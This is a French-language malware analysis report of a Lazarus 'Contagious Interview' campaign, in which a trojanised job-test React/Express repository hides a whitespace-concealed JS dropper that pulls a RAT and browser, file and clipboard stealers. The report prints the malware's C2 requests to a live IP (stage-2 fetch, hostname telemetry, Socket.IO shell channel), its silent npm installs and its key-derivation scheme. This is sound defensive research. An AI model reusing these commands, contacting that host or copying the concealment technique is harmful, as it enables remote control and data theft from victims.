# Analyse Lazarus Contagious Interview : dropper JS caché dans un faux projet de test technique (pspn-main), RAT et voleurs multi-modules

**Analyste :** Gordon PEIRS
**Date d'analyse :** 2026-07-27
**Type :** Analyse statique du dépôt trojanisé, complétée par une émulation en bac à sable Node.js (aucune exécution réelle du payload, aucun accès disque/processus/réseau réel accordé au code analysé). Une unique requête HTTP en lecture seule a été faite vers l'infrastructure C2 réelle pour récupérer le stage 2 chiffré, sans jamais l'exécuter.
**Famille :** Lazarus Group / DEV#POPPER (Contagious Interview), ciblage de développeurs via de fausses offres d'emploi et de faux "tests techniques" avant entretien

> La preuve de travail reproductible est dans [`runbook.md`](runbook.md). Les scripts et artefacts désobfusqués sont dans [`tools/`](tools/).

---

## 1. Contexte

Le point de départ est une archive `pspn-main.zip` reçue dans le cadre d'une fausse offre d'emploi via LinkedIn : un recruteur contacte la cible, lui propose un poste, puis lui demande de réaliser un "test technique" consistant à cloner et faire fonctionner un projet GitHub avant l'entretien. Le dépôt en question se présente comme `pspn-frontend`, un dashboard React/Express autour de PulseChain (wallet, swap de tokens, paris sportifs UFC).

Le projet est crédible : vraies dépendances web3 (`ethers`, `web3`, `@web3-onboard/*`), vrais assets graphiques, README cohérent avec des instructions d'installation standard (`npm install --legacy-peer-deps` puis `npm start`). Rien dans la structure du dépôt (README, structure de dossiers, historique apparent) ne signale une compromission au premier coup d'œil.

Le piège est placé dans le code serveur : un payload JavaScript obfusqué est caché dans un contrôleur Express, et s'exécute automatiquement dès que la victime lance le serveur pour tester l'application, exactement comme le README le demande.

---

## 2. Identité des échantillons

| Fichier | SHA256 | Taille | Rôle |
|---|---|---|---|
| `pspn-main.zip` | `c5435f903a4ab012718ab1094c85ecea1e316b1c8e61e090d43a84cfe03e4c5c` | 5 864 493 o | Archive du dépôt trojanisé (source du "test technique") |
| `server/controllers/userController.js` | `1d307af5034ecc0daee2a5d06abe624d63de18799e4826d72d6a35592120f345` | 31 763 o | Fichier hôte de l'injection |
| Payload stage 1 (extrait de la ligne 8) | `192037630d29ec97895d2d986b383dae1c68a47d18354beaee2f44fc7793548b` | 24 236 o | Dropper obfusqué |
| Réponse C2 stage 2 (chiffrée, récupérée en direct) | `04b9981cd85005990b607233b6cf5f46f5eefb82dfcd4de31c8112dcd7af062a` | 153 029 o | `IV_base64:ciphertext_base64` |
| Stage 2 déchiffré | `fefc0504d96b491a790702bff38e2b7cdd3c1520d52c07ef24e21ac1b8af1e5d` | 114 745 o | Lanceur de 4 sous-modules |
| `/tmp/scdata` (déposé par stage 2) | `e5395c4d0f37e0f3a643b725468087cbdf00cd13ccaae02c4c35de7890238fa1` | 16 919 o | RAT / shell interactif + SSH |
| `/tmp/ldata` (déposé par stage 2) | `9edae13f6438bff29b2a0223080344fdda13d1be6bab44139f679b43d256333a` | 11 474 o | Voleur de données navigateur |
| Script "grabber" (spawn inline) | `628d71d67eefc7c93194743359088bd9ff9daa10ca76d1d2a7ae071bfc49d899` | 9 601 o | Moissonneur de fichiers |
| Script "clipper" (spawn inline) | `2d18dcc30edbb90752aed0b651688ab0e830fa137edb6bc3e5eae4c73e8e4757` | 2 960 o | Espion de presse-papiers |

L'archive n'a pas été trouvée sur les plateformes de partage d'échantillons publiques au moment de l'analyse : elle provient directement de la cible de la campagne, pas d'un dépôt de recherche.

---

## 3. Outillage

- `unzip`, `grep`, `wc` : triage initial du dépôt
- Un binaire Electron (`code`, VS Code) lancé avec la variable d'environnement `ELECTRON_RUN_AS_NODE=1` : fait office d'interpréteur Node.js complet (v24.15.0) en l'absence de `node` installé sur la machine d'analyse
- [`tools/harness.js`](tools/harness.js) : bac à sable écrit pour cette analyse, basé sur le module `vm` de Node. Il charge le code obfusqué dans un contexte isolé où `require`, `fs`, `child_process` et tout appel réseau sont remplacés par des versions qui journalisent chaque appel puis renvoient une valeur inoffensive, sans jamais toucher le disque, lancer de processus ni contacter de serveur réel. Tout appel vers un module ou une fonction inconnue tombe sur un proxy "trou noir" (journalise, ne lève jamais d'exception, renvoie un nouveau trou noir) : la logique de contrôle du malware peut ainsi se dérouler jusqu'au bout sans jamais planter dans son propre `catch` silencieux
- [`tools/extract_stage1.py`](tools/extract_stage1.py) : extraction du payload caché dans `userController.js`
- [`tools/decrypt_stage2.py`](tools/decrypt_stage2.py) : déchiffrement AES-256-CBC / scrypt de la réponse C2, une fois le schéma retrouvé par émulation
- Python 3 (`hashlib`, `cryptography`) pour la vérification indépendante du déchiffrement

---

## 4. Stage 0 : le leurre GitHub

Le fichier `README.md` du dépôt indique littéralement :

```
npm install --legacy-peer-deps
npm start
```

`npm start` exécute `concurrently "node server/server.js" "react-scripts start"` (défini dans `package.json`). Le serveur Express charge `app.js`, qui charge `routes/userRoute.js`, qui charge `controllers/userController.js` avant même qu'aucune route ne soit appelée. Le payload s'exécute donc dès le démarrage du serveur, sans qu'aucune action supplémentaire de la victime ne soit nécessaire au-delà de suivre les instructions du README.

Deux dépendances du `package.json` sortent du lot pour un dashboard de paris sportifs web3 : `@primno/dpapi` (wrapper Windows DPAPI, utilisé habituellement pour déchiffrer des secrets stockés par les navigateurs Chromium) et `node-machine-id` (empreinte machine). Aucun appel à ces deux paquets n'a été trouvé dans le code source visible du dépôt (recherche exhaustive par `grep` sur tous les fichiers `.js`/`.ts`/`.tsx`). Ils ne sont probablement pas utilisés par le code embarqué directement, mais leur présence dans les dépendances déclarées reste un signal cohérent avec la nature de la campagne (le lien avec le stage 3 "voleur de données navigateur", qui a besoin d'une capacité de déchiffrement DPAPI sur Windows, n'a pas pu être confirmé faute d'avoir observé ce module tourner sous Windows réel).

---

## 5. Stage 1 : le dropper caché dans `userController.js`

### 5.1 Localisation

Ligne 8 du fichier, juste après un faux commentaire anodin :

```javascript
/* const path = require("node-path-addon"); */                    [des centaines d'espaces]        function b(c,d){...
```

Le commentaire imite un `require` inoffensif ; le payload réel suit, poussé hors de la fenêtre visible d'un éditeur de code par des centaines d'espaces, sur la même ligne. Toute lecture rapide du fichier dans un IDE standard ne montre que le commentaire.

### 5.2 Obfuscation

Signature obfuscator.io classique : un tableau de 330 chaînes encodées, deux fonctions de lookup (`b`, une seule décode custom-base64 ; `c`, décode custom-base64 puis applique un flux RC4 avec une clé passée en second paramètre), un IIFE anti-falsification qui fait tourner ces mêmes fonctions de lookup en boucle.

Une première tentative de désobfuscation par ré-implémentation Python de l'algorithme de décodage a produit des résultats majoritairement corrects mais avec une centaine d'échecs résiduels (essentiellement le bloc anti-falsification lui-même et quelques chaînes de la table de dispatch interne d'obfuscator.io, dont le décodage exact n'a pas pu être élucidé à la main). Le blocage a été levé en faisant tourner le code de décodage réel (les fonctions `a`/`b`/`c` du malware lui-même, purement fonctionnelles et sans effet de bord) dans le bac à sable Node plutôt qu'en essayant de deviner leur comportement exact : le taux de résolution passe alors à 100 %, et surtout la suite logique du programme (au-delà du simple tableau de chaînes) devient observable.

### 5.3 Comportement observé

En laissant tourner le payload réel dans le bac à sable (`require`/`fs`/`child_process`/réseau interceptés, journalisés, jamais réellement exécutés) :

1. `child_process.execSync("npm install axios socket.io-client --no-warnings --no-progress --loglevel silent", {windowsHide:true, cwd:"/tmp"})`. Ces deux paquets sont déjà des dépendances légitimes déclarées dans le `package.json` du projet : l'installation forcée est une garantie de disponibilité, camouflée en plein jour.
2. `require('axios')`, puis une requête vers :

   ```
   GET http://147.189.172.105/api/service/99cef4b32f24dcc475a4e7be8d2423c4
   Authentication: jwt
   ```

3. La chaîne `99cef4b32f24dcc475a4e7be8d2423c4` (identifiant de service dans l'URL) sert une seconde fois de mot de passe pour dériver une clé AES-256-CBC via `scrypt(id, salt="salt", N=16384, r=8, p=1, dklen=32)`.
4. La réponse attendue du C2 est au format `<IV en base64>:<texte chiffré en base64>`, déchiffrée avec la clé ci-dessus (padding PKCS7).

Cet identifiant fonctionne à la fois comme adresse du service et comme secret partagé : il est vraisemblablement généré par victime ou par build, ce qui permettrait à l'opérateur de servir des charges différentes selon la cible tout en gardant un seul point d'entrée HTTP.

---

## 6. Récupération réelle du stage 2

Le bac à sable a permis de reconstituer l'intégralité de l'URL et du schéma de déchiffrement sans jamais exécuter le payload. Une requête HTTP GET en lecture seule, reproduisant exactement celle que le malware aurait faite, a ensuite été envoyée à l'infrastructure réelle pour récupérer le contenu du stage 2 (le C2 était actif au moment de l'analyse) :

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153029
```

Corps : `<IV base64>:<ciphertext base64>`. Le déchiffrement avec la clé dérivée à l'étape précédente (`tools/decrypt_stage2.py`) donne 114 745 octets de JavaScript en clair, encore obfusqué avec le même schéma obfuscator.io (nouveau tableau de chaînes, nouvelles clés RC4). Aucune partie de ce contenu n'a été exécutée en dehors du même bac à sable Node isolé.

---

## 7. Stage 2 : le lanceur, quatre sous-modules

Une fois rejoué dans le bac à sable, le stage 2 dépose et lance quatre composants distincts, chacun comme process Node détaché :

### 7.1 `scdata` : RAT et shell interactif

```
child_process.execSync("npm install socket.io-client ssh2 node-pty@1.0.0 --no-warnings --no-progress --loglevel silent", ...)
```

Connexion Socket.IO vers `http://147.189.172.105:7861` (`reconnectionDelay: 2000`, `timeout: 2000000`). Onze gestionnaires d'événements enregistrés :

| Événement | Fonction probable |
|---|---|
| `start-terminal` / `terminal-input` / `terminal-resize` / `stop-terminal` | Pseudo-terminal interactif (via `node-pty`), streamé en direct au C2 |
| `command` | Exécution de commande arbitraire hors session terminal |
| `start_ssh` / `ssh_input` | Tunnel ou session SSH (via `ssh2`) |
| `whour`, `kill` | Codes de contrôle non identifiés précisément |
| `connect` / `disconnect` | Cycle de vie de la session |

Avant cette connexion, `scdata` crée un fichier verrou `/tmp/.npm/vhost.ctl` (contenu observé : `"3938716"`, vraisemblablement un identifiant de session ou un PID), lit `/proc/cpuinfo` (empreinte machine), et envoie un rapport de télémétrie :

```
POST http://147.189.172.105/api/service/makelog
{"message": "...", "host": os.hostname(), "uid": "99cef4b32f24dcc475a4e7be8d2423c4", "t": "180"}
```

Le champ `host` utilise le vrai nom de la machine locale (obtenu via `os.hostname()`, exécuté réellement dans le bac à sable car il s'agit d'un appel purement local et inoffensif) : la valeur n'a jamais quitté le bac à sable puisque la couche réseau était interceptée, mais elle confirme que ce champ de télémétrie identifie la machine victime par son hostname réel.

### 7.2 `ldata` : voleur de données navigateur

Requiert `form-data` (upload multipart), vérifie l'existence des répertoires de profil de plusieurs navigateurs à base Chromium :

- Google Chrome
- Microsoft Edge
- "lt-browser" (probablement un alias ou un navigateur additionnel visé)
- Brave (`BraveSoftware/Brave-Browser`)

Le motif (vérification de profils Chromium suivie d'un upload `form-data`) correspond au schéma classique de vol de `Login Data`/`Local State`/cookies des navigateurs Chromium : le module n'a pas été poussé jusqu'à l'étape d'upload effective dans le bac à sable (les vérifications `existsSync` renvoient systématiquement `false` dans l'émulation, ce qui interrompt la suite de la logique avant l'étape de lecture/upload).

### 7.3 Script "grabber" : moissonneur de fichiers

Lancé via `child_process.spawn('node', ['-e', <code>], {detached: true})`. Parcourt le répertoire personnel de l'utilisateur (`os.homedir()`) ainsi que `/mnt` (point de montage de disques additionnels, pertinent aussi bien pour des volumes réseau que pour des supports amovibles), avec une longue liste de dossiers exclus (caches, dépendances, dossiers système) pour cibler les fichiers utilisateur plutôt que le bruit. Utilise `form-data` et `axios` pour l'exfiltration, comme `ldata`.

### 7.4 Script "clipper" : espion de presse-papiers

Également lancé via `spawn(..., {detached: true})`. Renomme le titre du process (`process.title`), probablement pour se fondre dans la liste des processus. Lit le presse-papiers via `child_process.execSync` avec une commande dépendante de la plateforme (`os.platform()`), dans une boucle de sondage continue (`watchClipboard`), et transmet toute nouvelle valeur détectée via un appel `axios` vers le même type d'endpoint de télémétrie que `scdata` (`makelog`). Les commandes système exactes utilisées par plateforme n'ont pas été capturées littéralement : la boucle de sondage étant asynchrone et infinie par conception, le bac à sable a été arrêté avant qu'un appel `execSync` de lecture de presse-papiers ne se produise dans la fenêtre d'observation.

---

## 8. Infrastructure C2

| Indicateur | Rôle |
|---|---|
| `147.189.172.105` (HTTP, port 80) | Distribution du stage 2 chiffré (`/api/service/<uid>`), télémétrie (`/api/service/makelog`) |
| `147.189.172.105:7861` | Canal Socket.IO du RAT interactif (`scdata`) |
| `99cef4b32f24dcc475a4e7be8d2423c4` | Identifiant de service ET mot de passe de dérivation de clé (double usage) |

Un seul C2 a été identifié pour l'ensemble de la chaîne observée (contrairement à une distribution sur plusieurs adresses), avec une séparation logique entre le port HTTP standard (distribution de charge, télémétrie) et un port dédié (7861) pour le canal de contrôle interactif Socket.IO.

---

## 9. Méthodologie d'émulation sûre

Aucune étape de cette analyse n'a exécuté le payload sur une machine réelle ni laissé le code obfusqué toucher le système de fichiers, lancer un processus ou contacter un serveur sans contrôle :

- Le code du malware tourne dans un contexte `vm` Node.js isolé, où `require`, `fs`, `child_process` et toute primitive réseau sont remplacés par des fonctions qui journalisent l'appel puis renvoient une valeur inoffensive (chaîne vide, `false`, promesse rejetée ou résolue avec des données factices selon le besoin d'observation).
- Un décorateur "trou noir" générique intercepte tout appel vers une fonction ou un module non anticipé : il journalise puis renvoie un nouvel objet du même type, ce qui absorbe les branches de code imprévues sans jamais lever d'exception ni interrompre l'exécution.
- La seule interaction avec le monde réel a été une requête HTTP GET en lecture seule vers l'URL C2 reconstituée par l'émulation, pour récupérer le contenu du stage 2 tel que le C2 le sert réellement (le contenu chiffré ne pouvait pas être deviné, seulement le mécanisme pour le récupérer et le déchiffrer). Aucune commande, aucun fichier reçu du C2 n'a été exécuté : seul le texte JavaScript en clair, une fois déchiffré, a été relu dans le même bac à sable.

Cette méthode permet de laisser le malware "se déobfusquer lui-même" (ses propres fonctions de décodage sont correctes par construction) tout en garantissant qu'aucune charge utile réelle n'atteint jamais le disque, un processus ou un tiers.

---

## 10. Conclusion

La chaîne complète va d'un dépôt GitHub crédible, livré via une fausse offre d'emploi LinkedIn, jusqu'à un accès interactif complet à la machine de la victime (shell, tunnel SSH), en passant par un vol systématique de données de navigateur, de fichiers personnels et de presse-papiers. L'exécution démarre au premier `npm start`, sans qu'aucune interaction supplémentaire de la victime ne soit nécessaire.

Le point d'entrée technique (un payload caché derrière des centaines d'espaces après un faux commentaire, dans un fichier par ailleurs parfaitement fonctionnel et cohérent avec le reste du projet) illustre pourquoi une revue de code standard, orientée sur la lecture normale d'un fichier dans un éditeur, ne suffit pas à détecter ce type d'implant : la détection nécessite soit un outil qui signale les lignes anormalement longues, soit une inspection systématique du texte brut des fichiers avant exécution de tout projet reçu par un canal non vérifié.
